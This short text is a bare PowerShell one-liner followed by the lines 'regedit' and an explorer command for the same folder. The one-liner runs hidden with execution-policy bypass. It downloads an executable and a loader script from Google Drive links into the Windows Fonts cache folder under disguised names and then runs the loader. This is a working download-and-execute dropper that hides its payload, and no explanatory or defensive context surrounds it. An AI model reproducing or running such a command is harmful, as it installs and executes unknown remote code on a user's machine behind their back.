powershell -w hidden -ep bypass -c "iwr -useb 'https://drive.google.com/uc?export=download&id=1R3TdRR3nRXbMs-GNLKzM293sYn9IfkiN' -o '%LOCALAPPDATA%\Microsoft\Windows\Fonts\msft_font_cache.exe'; iwr -useb 'https://drive.google.com/uc?export=download&id=1rnTBtf64ITpWEy8Ft-gWEHWXcV4ojS2Y' -o '%LOCALAPPDATA%\Microsoft\Windows\Fonts\loader.ps1'; powershell -ep bypass -file '%LOCALAPPDATA%\Microsoft\Windows\Fonts\loader.ps1'"


regedit

explorer %LOCALAPPDATA%\Microsoft\Windows\Fonts
